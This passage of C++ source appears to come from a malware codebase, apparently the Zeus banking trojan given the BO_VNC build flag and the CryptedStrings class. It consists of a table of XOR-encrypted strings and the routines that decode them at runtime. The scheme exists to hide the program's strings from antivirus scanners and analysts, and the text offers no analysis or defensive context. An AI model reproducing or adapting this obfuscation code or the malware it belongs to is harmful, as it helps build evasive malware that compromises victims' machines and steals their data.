  {159,  35, "\xd9\xff\xf4\xf0\xfe\xfe\xb9\xec\xf8\xb6\xe6\xf5\xe5\xf7\xb1\xfc\xe0\xed\xec\xe0\xab\xe9\xe6\xe6\xe1\xef\xe2\xf1\xf1\xe3\xf5\xe9\xd0\xd0\x93"},
  { 10,  37, "\x4c\x6a\x61\x65\x6b\x6b\x2c\x79\x6d\x23\x65\x79\x63\x64\x71\x71\x7f\x3b\x7b\x76\x73\x72\x7d\x73\x76\x33\x71\x65\x36\x7b\x7d\x7b\x4f\x0b\x0d\x5c\x00"},
  {124,  27, "\x29\x13\x15\x11\x17\x0e\x14\x5b\x17\x1a\x1b\x1a\x11\x1f\x16\x53\x0d\x19\x4e\x03\x01\x07\x0f\x4b\x41\x10\x48"},
  { 55,   3, "\x78\x7d\x1b"},
#if(BO_VNC > 0)
  { 33,   7, "\x76\x49\x4d\x51\x51\x45\x17"},
  {177,   7, "\xd5\xd5\xd5\xd3\xc0\xd8\xc3"},
#endif
  {228,   7, "\x80\x92\x8b\xc9\x85\x99\x87"},
  {227,  12, "\x97\x83\x92\x8b\x8f\x89\x96\x90\xc5\x8f\x91\x8d"},
  {136,  11, "\xfc\xe8\xf9\xe0\xe9\xe3\xe9\xa1\xe5\xf9\xe7"},
  {119,  11, "\x00\x05\x16\x1a\x07\x14\x08\x5e\x1a\x06\x18"},
  {208,  10, "\xb3\xa5\xb4\xbe\xbb\xbb\xf8\xb2\xa0\xbc"},
  {128,  11, "\xf2\xe5\xf2\xe0\xe8\xec\xf6\xa9\xed\xf1\xef"},
  { 73,  12, "\x2c\x30\x3b\x26\x22\x3e\x2a\x3c\x6f\x25\x3b\x27"},
  {196,  23, "\x92\xcc\xe3\xf7\xf8\x99\xcf\xc9\x8f\xc4\xeb\xff\xf0\x91\xc7\xc1\x84\x86\xdf\xf2\xe0\xe9\x8a"},
  {127,  16, "\x3d\x31\x29\x5c\x35\x35\x2d\x58\x34\x24\x2c\x24\x27\x37\x35\x51"},
  {235,  44, "\xb8\xa5\xaf\xbc\xb8\xaf\xbf\xa9\xbf\xaf\x88\x83\x95\x89\x96\x8b\x9d\x8e\xa5\xaf\x96\x90\x99\x93\x84\x81\xd1\xbe\xa3\xaa\xb6\x81\xb9\xb8\xac\xa6\xbb\x98\xa8\xbe\xb0\xab\xae\xae"},
  { 36,  11, "\x6d\x4b\x55\x53\x41\x4d\x4e\x67\x4d\x59\x4b"},
  {107,  16, "\x2f\x03\x0e\x01\x1b\x0f\x01\x3c\x11\x0d\x05\x15\x04\x12\x2c\x00"},
  { 79,  11, "\x6a\x3d\x12\x69\x7b\x72\x11\x6d\x77\x7e\x1d"},
  {212,  11, "\xb2\xb4\xa2\xb6\xbc\x8e\xb7\xa1\xae\xb2\xac"},
  { 44,   7, "\x59\x43\x45\x41\x47\x5e\x44"},
  {217,  12, "\xae\xac\xa8\xbb\xad\xb5\xec\xec\xff\xb4\xbf\xbe"},
  { 25,  21, "\x4e\x4c\x48\x5f\x73\x69\x72\x7b\x63\x71\x67\x77\x46\x71\x64\x65\x60\x67\x65\x79\x5a"},
  {189,  13, "\xea\xe8\xec\xf8\xcb\xdd\xde\xf7\xd0\xd9\xd8\xc4\xc8"},
  {177,  17, "\xe6\xe4\xe0\xe3\xc0\xd1\xc5\xcf\xec\xcb\xde\xc8\xe9\xd3\xd4\xdb\xcf"},
  { 96,  11, "\x15\x12\x07\x11\x01\x0b\x10\x49\x0c\x05\x06"},
  {185,  31, "\xfe\xdd\xcf\xfe\xd8\xda\xde\xcb\xdd\xc4\xe6\xc1\xd0\xc6\xe7\xc4\xc6\xce\xc2\xc6\xc8\xe8\xc6\xdc\xc4\xc3\xd7\xcd\xd7\xdd\xf0"},
  {119,  10, "\x02\x05\x10\x06\x40\x40\x5f\x14\x13\x12"},
  {165,  11, "\xe8\xc1\xd4\xd5\xc0\xc7\xc6\xe0\xc2\xd4\xf8"},
  {160,   9, "\xce\xd5\xc6\xcf\xc8\x8b\xc2\xcb\xc4"},
  {  0,   0, NULL}
/*STRINGS_DATA_END*/
};

void CryptedStrings::init(void)
{

}

void CryptedStrings::uninit(void)
{

}

void CryptedStrings::_getA(WORD id, LPSTR buffer)
{
  STRINGINFO *s = (CryptedStrings::STRINGINFO *)&strings[id];
  for(unsigned short i = 0; i < s->size; i++)buffer[i] = (s->encodedString[i] ^ s->key) ^ i;
  buffer[s->size] = 0;
}

void CryptedStrings::_getW(WORD id, LPWSTR buffer)
{
  STRINGINFO *s = (CryptedStrings::STRINGINFO *)&strings[id];
  for(unsigned short i = 0; i < s->size; i++)buffer[i] = ((s->encodedString[i] ^ s->key) ^ i) & 0xff;
  buffer[s->size] = 0;
}
